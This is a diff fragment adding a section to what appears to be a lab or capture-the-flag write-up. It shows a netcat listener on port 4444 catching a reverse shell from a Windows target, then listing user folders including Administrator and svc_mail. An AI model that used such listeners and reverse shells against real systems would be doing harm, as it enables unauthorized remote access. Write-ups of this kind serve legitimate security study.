@@ -578,3 +578,37 @@ if __name__ == "__main__":
 ╰─                                                                                                                   ─╯
 
 ```
+
+``` bash
+
+❯ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.15.166] from (UNKNOWN) [10.129.80.127] 49611
+SHELL> cd C:\Users
+SHELL> pwd
+
+Path
+----
+C:\Users
+
+
+SHELL> dir
+
+
+    Directory: C:\Users
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         3/25/2026  10:40 PM                .NET v4.5
+d-----         3/25/2026  10:40 PM                .NET v4.5 Classic
+d-----         3/25/2026  10:19 PM                Administrator
+d-----         8/25/2026  12:48 AM                anderson.w
+d-----         3/26/2026   2:23 PM                noah.b
+d-r---         3/25/2026  10:19 PM                Public
+d-----         3/27/2026   5:53 PM                svc_mail
+
+
+SHELL>
+
+```
